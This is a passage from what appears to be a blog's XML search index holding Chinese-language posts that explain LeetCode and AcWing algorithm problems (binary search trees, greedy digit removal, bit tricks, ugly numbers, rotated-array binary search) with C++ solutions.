class="hljs-keyword">if</span>(!son[p][u])  <span class="hljs-keyword">break</span>;<br>        p=son[p][u];<br>        res+=cnt[p];<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        cin&gt;&gt;str;<br>        <span class="hljs-built_in">insert</span>(str);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        cin&gt;&gt;str;<br>        cout&lt;&lt;<span class="hljs-built_in">query</span>(str)&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 783.二叉搜索树节点最小距离</title>
      <link href="/2021/04/dbf62d11.html"/>
      <url>/2021/04/dbf62d11.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-783-二叉搜索树节点最小距离"><a href="#LeetCode-783-二叉搜索树节点最小距离" class="headerlink" title="LeetCode 783.二叉搜索树节点最小距离"></a><a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/">LeetCode 783.二叉搜索树节点最小距离</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>今天的题都比较无脑，直接无脑dfs搜索最小差值，暴力搜索一遍得出的最后结果就是最小值</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> ans, last;<br>    <span class="hljs-type">bool</span> is_first;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minDiffInBST</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        ans=INT_MAX, is_first=<span class="hljs-literal">true</span>;<br>        <span class="hljs-built_in">dfs</span>(root);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(TreeNode* root)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root)   <span class="hljs-keyword">return</span>;<br>        <span class="hljs-built_in">dfs</span>(root-&gt;left);<br>        <span class="hljs-keyword">if</span>(is_first)<br>        &#123;<br>            last=root-&gt;val;<br>            is_first=<span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            ans=<span class="hljs-built_in">min</span>(ans, root-&gt;val-last);<br>            last=root-&gt;val;<br>        &#125;<br>        <span class="hljs-built_in">dfs</span>(root-&gt;right);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-71-二叉树的深度"><a href="#AcWing-71-二叉树的深度" class="headerlink" title="AcWing 71.二叉树的深度"></a><a href="https://www.acwing.com/problem/content/67/">AcWing 71.二叉树的深度</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>无脑递归</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">treeDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root)   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">treeDepth</span>(root-&gt;left), <span class="hljs-built_in">treeDepth</span>(root-&gt;right))+<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> leetcode </tag>
            
            <tag> 树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 179.最大数</title>
      <link href="/2021/04/dc1af122.html"/>
      <url>/2021/04/dc1af122.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-179-最大数"><a href="#LeetCode-179-最大数" class="headerlink" title="LeetCode 179.最大数"></a><a href="https://leetcode-cn.com/problems/largest-number/">LeetCode 179.最大数</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>题意大概是给一个数组，然后数组内每个元素不能再拆分，进行排列后得到一个所有排列中数值最大的整数，这里思路比较明确，就是将其从大到小排序后（题目说明可以进行随意组合）逐项加入存储结果的字符串中即可，特别注意的是<strong>在极端情况即数组内含有[0,0]下有可能会出现双重前导0</strong>，对此要特别要进行一次处理。</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">largestNumber</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)<br>        &#123;<br>            <span class="hljs-keyword">auto</span> a =<span class="hljs-built_in">to_string</span>(x), b=<span class="hljs-built_in">to_string</span>(y);<br>            <span class="hljs-keyword">return</span> a+b&gt;b+a;<br>        &#125;);<br>        string res;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp; s: nums)  res+=<span class="hljs-built_in">to_string</span>(s);<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(k+<span class="hljs-number">1</span>&lt;res.<span class="hljs-built_in">size</span>() &amp;&amp; res[k]==<span class="hljs-string">&#x27;0&#x27;</span>)    k++;<span class="hljs-comment">//去除极端情况[0,0]时候出现前导0</span><br>        <span class="hljs-keyword">return</span> res.<span class="hljs-built_in">substr</span>(k);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1453-移掉K位数字"><a href="#AcWing-1453-移掉K位数字" class="headerlink" title="AcWing 1453.移掉K位数字"></a><a href="https://www.acwing.com/problem/content/1455/">AcWing 1453.移掉K位数字</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>此题与上一题思路比较类似，不过本题求的是移掉指定个数的位之后（不改变原顺序）使得得到的数最小，同时也从数字变成了一个数字。本题需要考虑到的是位越高的数字对数的大小影响最大，所以按照贪心的思路，只需要让高位数字尽可能的小，则最后得到的数一定是所有方案中最小的，因此让其每次都与当前答案的最后一位比较即可，小的就说明当前这个数更适合做高位，即将当前的高位删除。最后还要判断一个特殊情况，<strong>即当每一位都是相同数字时，则去掉任意位的数字即可</strong>，最后依然是要消去前导0，处理后的字符串即为最终结果。</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string num;<br>    <span class="hljs-type">int</span> k;<br>    cin&gt;&gt;num&gt;&gt;k;<br>    <br>    string res=<span class="hljs-string">&quot;0&quot;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> c:num)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(k&amp;&amp;c&lt;res.<span class="hljs-built_in">back</span>())  res.<span class="hljs-built_in">pop_back</span>(), k--;<br>        res+=c;<br>    &#125;<br>    <br>    <span class="hljs-keyword">while</span>(k--)  res.<span class="hljs-built_in">pop_back</span>();<span class="hljs-comment">//处理极端情况</span><br>    k=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(k+<span class="hljs-number">1</span> &lt; res.<span class="hljs-built_in">size</span>() &amp;&amp; res[k]==<span class="hljs-string">&#x27;0&#x27;</span>)  k++;<span class="hljs-comment">//去除前导0</span><br>    cout&lt;&lt;res.<span class="hljs-built_in">substr</span>(k)&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【AcWing】算法学习-二进制-更新中</title>
      <link href="/2021/04/e7fde3bf.html"/>
      <url>/2021/04/e7fde3bf.html</url>
      
        <content type="html"><![CDATA[<h2 id="二进制的笔记"><a href="#二进制的笔记" class="headerlink" title="二进制的笔记"></a>二进制的笔记</h2><p>n的二进制表示中第k位是几，例如</p><blockquote><p>n&#x3D;15&#x3D;(1111)2</p></blockquote><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol><li>先把第k位移到最后一位(n&gt;&gt;k)</li><li>观察一下个位是几(x&amp;1)</li></ol><h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p><code>n&gt;&gt;k&amp;1</code></p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><code>lowbit(x)</code>返回x的最后一位1</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">x</span><span class="hljs-operator">=</span><span class="hljs-number">1010</span> lowbit(x)<span class="hljs-operator">=</span><span class="hljs-number">10</span><br><span class="hljs-attribute">x</span><span class="hljs-operator">=</span><span class="hljs-number">101000</span> lowbit(x)<span class="hljs-operator">=</span><span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p><strong>实现原理</strong>:x&amp;-x(&#x3D;x&amp;(~x+1))</p><h2 id="例题：AcWing-801-二进制中1的个数"><a href="#例题：AcWing-801-二进制中1的个数" class="headerlink" title="例题：AcWing 801.二进制中1的个数"></a>例题：<a href="https://www.acwing.com/problem/content/803/">AcWing 801.二进制中1的个数</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> x &amp; -x;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> x;<br>        cin&gt;&gt;x;<br>        <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(x)    x-=<span class="hljs-built_in">lowbit</span>(x), res++;<br>        cout&lt;&lt;res&lt;&lt;<span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 263.丑数</title>
      <link href="/2021/04/72212b99.html"/>
      <url>/2021/04/72212b99.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-263-丑数"><a href="#LeetCode-263-丑数" class="headerlink" title="LeetCode 263.丑数"></a><a href="https://leetcode-cn.com/problems/ugly-number/">LeetCode 263.丑数</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>模拟题，根据题目条件写判断即可</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isUgly</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(n&lt;=<span class="hljs-number">0</span>)    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">while</span>(n%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)   n/=<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">while</span>(n%<span class="hljs-number">3</span>==<span class="hljs-number">0</span>)   n/=<span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">while</span>(n%<span class="hljs-number">5</span>==<span class="hljs-number">0</span>)   n/=<span class="hljs-number">5</span>;<br>        <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-62-丑数"><a href="#AcWing-62-丑数" class="headerlink" title="AcWing 62.丑数"></a><a href="https://www.acwing.com/problem/content/58/">AcWing 62.丑数</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>这里要求第n个丑数，对于效率的要求就更高了，但是思路依然是比较清晰，就是在数组里面把2，3，5从小到大的数用集合存起来，然后根据性质还有升序的规则一个一个的算出来即可（三路归并）但是这三路里面是有重合的，所以在写的时候还要考虑一下去重的问题，最后得到的这个总的集合就是所有只包含2，3，5为质因子</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getUglyNumber</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(n&lt;<span class="hljs-number">2</span>)    <span class="hljs-keyword">return</span> n;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</span></span>;<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>,k=<span class="hljs-number">0</span>;<br>        ll t=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(--n)<br>        &#123;<br>            t=<span class="hljs-built_in">min</span>(f[i]*<span class="hljs-number">2</span>, <span class="hljs-built_in">min</span>(f[j]*<span class="hljs-number">3</span>,  f[k]*<span class="hljs-number">5</span>));<br>            <span class="hljs-keyword">if</span>(t==f[i]*<span class="hljs-number">2</span>)   i++;<br>            <span class="hljs-keyword">if</span>(t==f[j]*<span class="hljs-number">3</span>)   j++;<br>            <span class="hljs-keyword">if</span>(t==f[k]*<span class="hljs-number">5</span>)   k++;<br>            f.<span class="hljs-built_in">push_back</span>(t);<br>        &#125;<br>        <span class="hljs-keyword">return</span> f.<span class="hljs-built_in">back</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode 154.寻找旋转排序数组中的最小值 II</title>
      <link href="/2021/04/b04e1ac.html"/>
      <url>/2021/04/b04e1ac.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode-154-寻找旋转排序数组中的最小值-II"><a href="#LeetCode-154-寻找旋转排序数组中的最小值-II" class="headerlink" title="LeetCode 154.寻找旋转排序数组中的最小值 II"></a><a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array-ii/">LeetCode 154.寻找旋转排序数组中的最小值 II</a></h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这道题和前两天的每日一题解法基本一致，就是无论怎样旋转，他在一个分界点前后分别都是单调递增的，而这个分界点就是整个数组的最小值，如图</p><p><img src="https://www.acwing.com/media/article/image/2018/05/31/1_92f5550a64-2.png" alt="img"></p><p>其中，最右侧的平行部分的数与最左边平行数相同，这部分不满足二分性质，因此需要去掉（或者加一条相同数取较小序号应该也可以执行，可以自行尝试下）因此，只需要通过二分法找到这个最小分界点即可，为了避免对边界情况的处理，可以在数组长度较小的时候直接线性扫描出最小值（这里选择为5，可以自行调整）</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMin</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>, r=nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r &amp;&amp; nums[r]==nums[l])  r--;<br>        <span class="hljs-keyword">if</span>(r-l+<span class="hljs-number">1</span>&lt;<span class="hljs-number">5</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> res=INT_MAX;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> x : nums)   res=<span class="hljs-built_in">min</span>(res,x);<br>            <span class="hljs-keyword">return</span> res;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(nums[<span class="hljs-number">0</span>]&lt;=nums[r])    <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">while</span>(l&lt;r)<br>            &#123;<br>                <span class="hljs-type">int</span> mid=(l+r+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>;<br>                <span class="hljs-keyword">if</span>(nums[mid]&gt;=nums[<span class="hljs-number">0</span>])  l=mid;<br>                <span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> nums[r+<span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="AcWing-69-数组中数值和下标相等的元素"><a href="#AcWing-69-数组中数值和下标相等的元素" class="headerlink" title="AcWing 69.数组中数值和下标相等的元素"></a><a href="https://www.acwing.com/problem/content/65/">AcWing 69.数组中数值和下标相等的元素</a></h2><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><blockquote><p>性质:nums[i]-i &gt;&#x3D; nums[i-1]-(i-1)</p></blockquote><p>由以上思路即可进行二分，由于题目只要求找到任意一个，所以不需要加任何条件限制，直接解出结果然后再单独对二分点进行判断即可</p><h4 id="C-代码-1"><a href="#C-代码-1" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getNumberSameAsIndex</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>, r=nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(l&lt;r)<br>        &#123;<br>            <span class="hljs-type">int</span> mid=(l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(nums[mid]-mid&gt;=<span class="hljs-number">0</span>)    r=mid;<br>            <span class="hljs-keyword">else</span> l=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(nums[r]-r==<span class="hljs-number">0</span>)    <span class="hljs-keyword">return</span> r;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> acwing </tag>
            
            <tag> leetcode </tag>
            
            <tag> 每日一题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】LeetCode153.寻找旋转排序数组中的最小值</title>
      <link href="/2021/04/76256c75.html"/>
      <url>/2021/04/76256c75.html</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode153-寻找旋转排序数组中的最小值"><a href="#LeetCode153-寻找旋转排序数组中的最小值" class="headerlink" title="LeetCode153.寻找旋转排序数组中的最小值"></a>LeetCode153.寻找旋转排序数组中的最小值</h2><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这道题的大概意思是将数组进行顺序（划重点）变换以后，要求最终的最小的元素，题目指出的数据量只有5000，那么直接线性搜索应该也可以过，但是这道题用二分的思路来考虑的话会更有趣一些。<br>先看看体面中的例子</p><blockquote><p>数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p></blockquote><p>由题中给出的例子来看，<em>这个数组不论旋转多少次，都存一个一个中间点，这个中间点之前和之后的数据都是有序的</em>，而这个中间点在原始状态下是在整个数组的最前面的，这时候整个数组都是有序的(特判要点)，而在朴素情况下，这个中间点就是指的二分点，所以此题得解</p><h4 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findMin</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(nums.<span class="hljs-built_in">back</span>() &gt; nums[<span class="hljs-number">0</span>])   <span class="hljs-keyword">return</span> nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>,r=nums.<span class="hljs-built_in">size</span>()<span 